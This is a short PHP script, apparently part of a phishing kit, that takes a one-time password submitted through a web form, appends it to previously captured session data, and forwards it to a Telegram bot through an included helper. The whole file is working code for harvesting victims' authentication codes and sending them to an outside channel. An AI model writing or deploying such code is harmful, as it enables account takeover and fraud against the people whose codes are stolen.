<?php

session_start();

include "./telegram.php";

$message = $_SESSION['message'];
$code = $_POST['code'];

$string = $message;
$string .= "OTP : `$code`\n";

$_SESSION['message'] = $string;

sendTelegram($string);
